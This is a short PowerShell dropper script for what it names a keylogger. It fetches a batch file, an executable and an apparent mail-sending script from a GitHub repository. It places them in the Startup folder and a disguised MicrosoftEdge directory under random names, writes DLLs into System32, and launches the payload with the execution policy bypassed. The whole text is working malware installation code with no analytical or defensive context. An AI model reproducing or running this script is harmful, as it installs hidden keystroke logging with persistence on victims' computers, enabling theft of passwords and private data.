Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/autostarting.bat" -OutFile "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe"
Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1"
if (-not (Test-Path "C:\Windows\System32\msvcp140d.dll")) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/dll/msvcp140d.dll" -OutFile "C:\Windows\System32\msvcp140d.dll"
}
if (-not (Test-Path "C:\Windows\System32\ucrtbased.dll")) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/dll/msvcp140d.dll" -OutFile "C:\Windows\System32\ucrtbased.dll"
}
if (-not (Test-Path "C:\Windows\System32\vcruntime140_1d.dll")) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/dll/msvcp140d.dll" -OutFile "C:\Windows\System32\vcruntime140_1d.dll"
}
if (-not (Test-Path "C:\Windows\System32\vcruntime140d.dll")) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/dll/msvcp140d.dll" -OutFile "C:\Windows\System32\vcruntime140d.dll"
}
powershell -executionpolicy bypass -File "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
